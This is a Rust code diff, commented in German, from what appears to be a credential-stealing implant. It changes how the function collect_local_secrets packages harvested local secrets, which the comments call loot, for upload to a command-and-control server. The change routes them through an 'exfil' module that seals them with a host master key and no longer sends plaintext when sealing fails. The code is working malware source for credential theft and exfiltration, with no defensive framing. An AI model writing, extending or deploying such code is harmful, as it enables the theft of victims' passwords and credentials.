@@ -16,7 +16,6 @@ use clap::Parser;
 
 use kx_core::persist::Invocation;
 
-use crate::hostkey::versiegel;
 use tracing::{error, info};
 
 /// Bearer-Token, dessen Debug-Ausgabe den Wert maskiert.
@@ -313,21 +312,22 @@ async fn collect_local_secrets(
         );
     }
 
+    // Der Master-Key gehoert zum Host, von dem das Stueck stammt. Ohne ihn
+    // geht die Beute im Klartext an den C2 — der dokumentierte Normalfall
+    // eines Agenten ohne Server-Schluessel.
+    let master_key = schluessel.as_ref().map(|k| k.roh.as_slice());
+
     secrets
         .into_iter()
-        .map(|secret| {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            kx_core::c2::SecretUpload {
-                host_id: host_id.to_string(),
-                cred_type: secret.secret_type,
-                username: secret.target,
-                password: String::new(),
-                source: Some(secret.source),
-                master_key: None,
-                sealed_password: None,
+        .filter_map(|secret| {
+            match kx_core::exfil::ExfiltratedSecret::new(&secret, master_key).upload(host_id) {
+                Ok(upload) => Some(upload),
+                // Der Klartext geht nicht als Ersatz raus — das Stueck bleibt.
+                Err(e) => {
+                    error!("Beute nicht versiegelbar, sie bleibt hier: {e}");
+                    None
+                }
             }
-            .mit_versiegeltem_passwort(versiegelt)
-            .mit_passwort(&klartext)
         })
         .collect()
 }
